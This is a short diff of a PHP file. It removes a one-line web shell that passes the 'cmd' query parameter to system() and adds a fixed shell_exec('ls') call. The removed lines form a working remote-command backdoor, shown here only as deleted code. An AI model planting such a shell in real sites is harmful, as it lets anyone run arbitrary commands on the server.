@@ -1,5 +1,8 @@
 <?php
-if (isset($_GET['cmd'])) {
-    system($_GET['cmd']);
-}
+
+
+echo shell_exec('ls');
+
+
+
 ?>
